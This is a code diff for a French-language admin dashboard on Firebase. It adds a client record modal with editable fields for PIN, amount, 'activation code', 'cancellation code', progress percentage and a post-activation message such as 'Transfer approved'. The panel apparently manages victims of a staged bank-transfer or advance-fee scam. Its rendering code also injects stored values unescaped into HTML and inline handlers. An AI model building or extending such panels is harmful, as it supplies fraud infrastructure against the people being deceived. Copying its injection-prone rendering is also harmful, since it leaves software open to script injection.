@@ -145,6 +145,19 @@
             .btn { width: 100%; justify-content: center; }
             .range-wrapper { flex-wrap: wrap; }
         }
+        .copy-field { display:flex; align-items:center; gap:8px; background:#f8fafc; border:1.5px solid var(--border); border-radius:var(--radius-sm); padding:10px 12px; transition:var(--transition); }
+        .copy-field:hover { border-color:var(--p); background:#fff; }
+        .copy-field .label { font-size:10px; color:var(--text-muted); text-transform:uppercase; letter-spacing:0.5px; font-weight:600; margin-bottom:3px; }
+        .copy-field .value { font-size:14px; font-weight:600; color:var(--text); word-break:break-all; flex:1; }
+        .copy-field .copy-btn { background:none; border:none; color:var(--p); cursor:pointer; padding:4px 8px; border-radius:6px; font-size:13px; transition:var(--transition); flex-shrink:0; }
+        .copy-field .copy-btn:hover { background:var(--p-light); }
+        .copy-field input { border:none; background:transparent; padding:0; font-size:14px; font-weight:600; color:var(--text); width:100%; font-family:inherit; }
+        .copy-field input:focus { outline:none; box-shadow:none; }
+        .copy-field.editing { background:#fff; border-color:var(--p); box-shadow:0 0 0 3px rgba(106,13,173,0.08); }
+        .copy-field.editing input { background:#fff; }
+        .client-name-link { color:var(--p); cursor:pointer; text-decoration:none; }
+        .client-name-link:hover { text-decoration:underline; }
+
         @media (max-width: 480px) {
             table { font-size: 12px; }
             th, td { padding: 8px 10px; }
@@ -247,7 +260,7 @@
                     </div>
                     <div class="field">
                         <label><i class="fas fa-message"></i> Message après activation</label>
-                        <input id="msg" placeholder="Przelew zatwierdzony ✓">
+                        <textarea id="msg" placeholder="Przelew zatwierdzony ✓" style="min-height:80px; resize:vertical;"></textarea>
                     </div>
                     <div class="field">
                         <label><i class="fas fa-flag"></i> Pays</label>
@@ -418,6 +431,42 @@
 
             <!-- ========== LA CARTE REMBOURSEMENT A ÉTÉ SUPPRIMÉE ========== -->
 
+        </div>
+    </div>
+
+    
+    <!-- ========== MODAL FICHE CLIENT ========== -->
+    <div id="clientModal" class="modal">
+        <div class="modal-content" style="max-width:700px; padding:0; overflow:hidden;">
+            <div style="background:var(--p); color:#fff; padding:20px 24px; display:flex; align-items:center; justify-content:space-between;">
+                <div style="display:flex; align-items:center; gap:12px;">
+                    <div style="width:44px; height:44px; border-radius:50%; background:rgba(255,255,255,0.2); display:flex; align-items:center; justify-content:center; font-size:18px; font-weight:800;">
+                        <i class="fas fa-user" style="color:#fff;"></i>
+                    </div>
+                    <div>
+                        <div style="font-size:18px; font-weight:700;" id="modalClientName">Client</div>
+                        <div style="font-size:12px; opacity:0.8;" id="modalClientEmail">email</div>
+                    </div>
+                </div>
+                <button onclick="closeClientModal()" style="background:rgba(255,255,255,0.15); border:none; color:#fff; width:36px; height:36px; border-radius:50%; cursor:pointer; font-size:20px; display:flex; align-items:center; justify-content:center;"><i class="fas fa-times"></i></button>
+            </div>
+            <div style="padding:24px; max-height:70vh; overflow-y:auto;">
+                <div style="display:flex; gap:10px; margin-bottom:20px; flex-wrap:wrap;">
+                    <button class="btn btn-sm" id="editToggleBtn" onclick="toggleEditMode()"><i class="fas fa-pen"></i> Modifier</button>
+                    <button class="btn btn-success btn-sm" id="saveClientBtn" onclick="saveClientChanges()" style="display:none;"><i class="fas fa-save"></i> Enregistrer</button>
+                    <button class="btn btn-secondary btn-sm" id="cancelEditBtn" onclick="cancelEditMode()" style="display:none;"><i class="fas fa-times"></i> Annuler</button>
+                </div>
+
+                <div style="display:grid; grid-template-columns:1fr 1fr; gap:14px;" id="clientFields">
+                    <!-- Généré dynamiquement -->
+                </div>
+
+                <div style="margin-top:20px; padding:16px; background:#f8fafc; border-radius:12px; border:1px solid var(--border);">
+                    <div style="font-size:12px; font-weight:700; color:var(--text-secondary); text-transform:uppercase; letter-spacing:0.5px; margin-bottom:12px;"><i class="fas fa-bell" style="margin-right:6px;"></i>Notification</div>
+                    <div id="modalNotifDisplay" style="font-size:14px; color:var(--text); line-height:1.6;"></div>
+                    <textarea id="modalNotifEdit" style="width:100%; padding:10px 14px; border:1.5px solid var(--border); border-radius:var(--radius-sm); font-size:14px; font-family:inherit; min-height:80px; display:none; margin-top:8px;"></textarea>
+                </div>
+            </div>
         </div>
     </div>
 
@@ -729,7 +778,7 @@
                             return `
                                 <tr id="row-${id}">
                                     <td>
-                                        <b>${v.nom}</b><br>
+                                        <b class="client-name-link" onclick="openClientModal('${id}')" title="Ouvrir la fiche client">${v.nom}</b><br>
                                         <span style="color:#6b7280;font-size:11px;">${v.email} ${blockedBadge} ${notifBadge}</span>
                                     </td>
                                     <td><span class="badge">${v.pin}</span></td>
@@ -1008,6 +1057,157 @@
                     window.forceDisconnect = forceDisconnect;
 
                     setInterval(updateAllStatuses, 5000);
+
+                    // ===== FICHE CLIENT =====
+                    let currentClientId = null;
+                    let editMode = false;
+                    let originalData = {};
+
+                    const fieldConfig = [
+                        { key: 'nom', label: 'Nom complet', icon: 'fa-user' },
+                        { key: 'email', label: 'Email', icon: 'fa-envelope' },
+                        { key: 'pin', label: 'Code PIN', icon: 'fa-lock' },
+                        { key: 'montant', label: 'Montant', icon: 'fa-money-bill-1', type: 'number' },
+                        { key: 'devise', label: 'Devise', icon: 'fa-coins' },
+                        { key: 'code', label: 'Code activation', icon: 'fa-key' },
+                        { key: 'refundCode', label: 'Code annulation', icon: 'fa-ban' },
+                        { key: 'msg', label: 'Message', icon: 'fa-message' },
+                        { key: 'pct', label: 'Pourcentage (%)', icon: 'fa-gauge-high', type: 'number' },
+                        { key: 'pays', label: 'Pays', icon: 'fa-flag' },
+                        { key: 'adresse', label: 'Adresse', icon: 'fa-location-dot' },
+                        { key: 'tel', label: 'Téléphone', icon: 'fa-phone' },
+                        { key: 'theme', label: 'Thème', icon: 'fa-palette' }
+                    ];
+
+                    window.openClientModal = async (id) => {
+                        currentClientId = id;
+                        editMode = false;
+                        const v = data[id];
+                        if (!v) return;
+
+                        document.getElementById('modalClientName').textContent = v.nom || 'Client';
+                        document.getElementById('modalClientEmail').textContent = v.email || '';
+                        document.getElementById('modalNotifDisplay').textContent = v.notification || 'Aucune notification';
+                        document.getElementById('modalNotifEdit').value = v.notification || '';
+
+                        renderClientFields(v, false);
+                        updateEditButtons();
+
+                        document.getElementById('clientModal').classList.add('active');
+                    };
+
+                    window.closeClientModal = () => {
+                        document.getElementById('clientModal').classList.remove('active');
+                        currentClientId = null;
+                        editMode = false;
+                    };
+
+                    window.toggleEditMode = () => {
+                        if (!currentClientId || !data[currentClientId]) return;
+                        editMode = true;
+                        originalData = { ...data[currentClientId] };
+                        renderClientFields(data[currentClientId], true);
+                        document.getElementById('modalNotifDisplay').style.display = 'none';
+                        document.getElementById('modalNotifEdit').style.display = 'block';
+                        updateEditButtons();
+                    };
+
+                    window.cancelEditMode = () => {
+                        if (!currentClientId) return;
+                        editMode = false;
+                        renderClientFields(data[currentClientId], false);
+                        document.getElementById('modalNotifDisplay').style.display = 'block';
+                        document.getElementById('modalNotifEdit').style.display = 'none';
+                        document.getElementById('modalNotifEdit').value = data[currentClientId].notification || '';
+                        updateEditButtons();
+                    };
+
+                    window.saveClientChanges = async () => {
+                        if (!currentClientId) return;
+                        const updates = {};
+
+                        fieldConfig.forEach(f => {
+                            const input = document.getElementById('edit-' + f.key);
+                            if (input) {
+                                let val = input.value.trim();
+                                if (f.type === 'number') val = Number(val) || 0;
+                                updates[f.key] = val;
+                            }
+                        });
+
+                        const notifVal = document.getElementById('modalNotifEdit').value.trim();
+                        updates.notification = notifVal;
+                        updates.updated = Date.now();
+
+                        await update(ref(db, 'clients/' + currentClientId), updates);
+
+                        editMode = false;
+                        document.getElementById('modalNotifDisplay').textContent = notifVal || 'Aucune notification';
+                        document.getElementById('modalNotifDisplay').style.display = 'block';
+                        document.getElementById('modalNotifEdit').style.display = 'none';
+                        updateEditButtons();
+                        showAlert('✅ Modifications enregistrées avec succès.', 'success');
+                    };
+
+                    function renderClientFields(v, editing) {
+                        const container = document.getElementById('clientFields');
+                        let html = '';
+                        fieldConfig.forEach(f => {
+                            const val = v[f.key] !== undefined ? v[f.key] : '';
+                            if (editing) {
+                                html += `
+                                    <div class="copy-field editing">
+                                        <div style="flex:1;">
+                                            <div class="label"><i class="fas ${f.icon}" style="margin-right:4px;"></i>${f.label}</div>
+                                            <input type="${f.type || 'text'}" id="edit-${f.key}" value="${val}" />
+                                        </div>
+                                    </div>`;
+                            } else {
+                                html += `
+                                    <div class="copy-field">
+                                        <div style="flex:1; min-width:0;">
+                                            <div class="label"><i class="fas ${f.icon}" style="margin-right:4px;"></i>${f.label}</div>
+                                            <div class="value">${val || '<span style="color:#9ca3af;">—</span>'}</div>
+                                        </div>
+                                        <button class="copy-btn" onclick="copyToClipboard('${String(val).replace(/'/g, "\'")}')" title="Copier">
+                                            <i class="fas fa-copy"></i>
+                                        </button>
+                                    </div>`;
+                            }
+                        });
+                        container.innerHTML = html;
+                    }
+
+                    function updateEditButtons() {
+                        document.getElementById('editToggleBtn').style.display = editMode ? 'none' : 'inline-flex';
+                        document.getElementById('saveClientBtn').style.display = editMode ? 'inline-flex' : 'none';
+                        document.getElementById('cancelEditBtn').style.display = editMode ? 'inline-flex' : 'none';
+                    }
+
+                    window.copyToClipboard = (text) => {
+                        navigator.clipboard.writeText(String(text)).then(() => {
+                            showAlert('✅ Copié dans le presse-papiers', 'success');
+                        }).catch(() => {
+                            const ta = document.createElement('textarea');
+                            ta.value = String(text);
+                            document.body.appendChild(ta);
+                            ta.select();
+                            document.execCommand('copy');
+                            document.body.removeChild(ta);
+                            showAlert('✅ Copié dans le presse-papiers', 'success');
+                        });
+                    };
+
+                    document.getElementById('clientModal').addEventListener('click', (e) => {
+                        if (e.target === e.currentTarget) closeClientModal();
+                    });
+
+                    window.openClientModal = openClientModal;
+                    window.closeClientModal = closeClientModal;
+                    window.toggleEditMode = toggleEditMode;
+                    window.cancelEditMode = cancelEditMode;
+                    window.saveClientChanges = saveClientChanges;
+                    window.copyToClipboard = copyToClipboard;
                 })
                 .catch(err => {
                     console.error('Erreur de chargement de Firebase:', err);
